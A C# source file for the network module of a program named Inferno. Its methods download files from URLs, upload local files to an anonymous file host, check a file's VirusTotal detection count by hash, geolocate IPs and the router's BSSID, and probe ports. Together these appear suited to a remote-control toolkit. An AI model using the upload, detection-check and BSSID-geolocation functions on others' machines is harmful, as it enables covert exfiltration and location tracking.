using Newtonsoft.Json.Linq;
using System;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace Inferno
{
    internal class network
    {
        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        public static extern int SendARP(int destIp, int srcIP, byte[] macAddr, ref uint physicalAddrLen);
        
        // Output
        private static dynamic output = new System.Dynamic.ExpandoObject();

     

        // Download file
        public static void downloadFile(string url, string foutput = "")
        {
            if(string.IsNullOrEmpty(foutput))
            {
                foutput = url.Split('/')[url.Split('/').Length - 1];
            }
            WebClient webClient = new WebClient();
            webClient.DownloadFile(url, foutput);
            
            output.filename = foutput;
            core.Exit("File downloaded", output);
        }

        // Upload file to Anonfile.com
        public static void uploadFile(string filename)
        {
            // Check
            if (!File.Exists(filename))
            {
                output.error = true;
                core.Exit("File " + filename + " not found!", output, 1);
            }
            // POST request
            WebClient client = new WebClient();
            client.Encoding = System.Text.Encoding.UTF8;
            byte[] responseBytes = client.UploadFile(@"https://api.anonfile.com/upload", "POST", filename);
            string response = System.Text.Encoding.ASCII.GetString(responseBytes);
            client.Dispose();
            // Parse json
            dynamic json = JObject.Parse(response);
            // Check upload status
            bool status = json["status"];
            if (!status)
            {
                output.error = true;
                output.msg   = json.error.message;
                output.type  = json.error.type;
                output.code  = json.error.code;
                core.Exit("Failed upload file", output);
            } else
            {
                output.url = json.data.file.url.full;
                core.Exit("File uploaded successfully!", output);
            }
        }
        
        // Whois
        public static void Whois(string ip = "")
        {
            // Url
            string url = @"http://ip-api.com/json/" + ip;
            // GET request
            WebClient client = new WebClient();
            string response = client.DownloadString(url);
            // Parse json
            dynamic json = JObject.Parse(response);
            output.whois = json;
            core.Exit("Whois data received!", output);
        }

        // Geoplugin
        public static void Geoplugin(string ip = "")
        {
            // Url
            string url = @"http://www.geoplugin.net/json.gp?ip=" + ip;
            // GET request
            WebClient client = new WebClient();
            string response = client.DownloadString(url);
            // Parse json
            dynamic json = JObject.Parse(response);
            output.whois = json;
            core.Exit("Geo data received!", output);
        }

        // VirusTotal detection
        public static void VirusTotal(string filename)
        {
            // Url
            string vt_api = "https://www.virustotal.com/ui/search?query=";
            // Check file
            if (!File.Exists(filename))
            {
                output.error = true;
                core.Exit("Failed to check VirusTotal, " + filename + " not found!", output, 1);
            }
            else
            {
                // Get file md5 hash
                var md5 = System.Security.Cryptography.MD5.Create();
                var stream = File.OpenRead(filename);
                byte[] checksum = md5.ComputeHash(stream);
                var hash = BitConverter.ToString(checksum).Replace("-", String.Empty).ToLower();
                // GET request
                WebClient client = new WebClient();
                string response = client.DownloadString(vt_api + hash);
                // Parse json
                dynamic json = JObject.Parse(response);
                try
                {
                    dynamic result = new System.Dynamic.ExpandoObject();
                    result.virustotal = json["data"][0]["attributes"]["last_analysis_stats"];
                    output.malicious = result.virustotal["malicious"];
                    output.suspicious = result.virustotal["suspicious"];
                    output.harmless = result.virustotal["harmless"];
                    output.undetected = result.virustotal["undetected"];

                } catch (ArgumentOutOfRangeException) {
                    output.error = true;
                    core.Exit("This file has never been uploaded to VirusTotal", output);
                }
                output.hash = hash;
                output.report = "https://www.virustotal.com/gui/file/" + hash + "/detection";
                core.Exit("VirusTotal data received!", output);
            }
        }

        // BSSID get info
        public static void BssidInfo(string bssid)
        {
            // Url
            string url = @"https://api.mylnikov.org/geolocation/wifi?bssid=" + bssid;
            // GET request
            WebClient client = new WebClient();
            string response = client.DownloadString(url);
            // Parse json
            dynamic json = JObject.Parse(response);
            // Check results
            if(json.result == 200)
            {
                output.bssid = json.data;
                core.Exit("BSSID info received!", output);
            } else {
                output.error = true;
                core.Exit(json.desc.ToString(), output);
            }
        }

        // Get router BSSID
        public static void BssidGet()
        {
            NetworkInterface[] adapters = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface adapter in adapters)
            {
                IPInterfaceProperties adapterProperties = adapter.GetIPProperties();
                GatewayIPAddressInformationCollection addresses = adapterProperties.GatewayAddresses;
                if (addresses.Count > 0)
                {
                    foreach (GatewayIPAddressInformation address in addresses)
                    {
                        string ip = address.Address.ToString();
                        // Check ip '.'
                        if (ip.Split('.').Length == 4)
                        {
                            // Check port 80
                            if(portIsOpen(ip, 80))
                            {
                                // Get BSSID
                                IPAddress dst = IPAddress.Parse(ip);
                                byte[] macAddr = new byte[6];
                                uint macAddrLen = (uint)macAddr.Length;
                                if (SendARP(BitConverter.ToInt32(dst.GetAddressBytes(), 0), 0, macAddr, ref macAddrLen) != 0)
                                {
                                    output.router_ip = ip;
                                    output.error = true;
                                    core.Exit("Send ARP failed", output, 3);
                                }
                                    
                                string[] str = new string[(int)macAddrLen];
                                for (int i = 0; i < macAddrLen; i++)
                                    str[i] = macAddr[i].ToString("x2");
                                string bssid = string.Join(":", str);

                                output.router_ip = ip;
                                output.bssid = bssid;
                                core.Exit("Router BSSID received!", output);
                            }
                        }
                    }
                }
            }
        }
        
        // Check target port
        private static bool portIsOpen(string target, int port)
        {
            TcpClient tcpClient = new TcpClient();
            try {
                tcpClient.Connect(target, port);
                return true;
            } catch (Exception) {
                return false;
            }
        }

        // Check target port
        public static void PortIsOpen(string target, string port)
        {
            if(portIsOpen(target, Int32.Parse(port)))
            {
                output.portIsOpen = true;
                core.Exit("Port " + port + " is open!", output);
            } else {
                output.portIsOpen = false;
                core.Exit("Port " + port + " is closed!", output);
            }
        }
    }
}
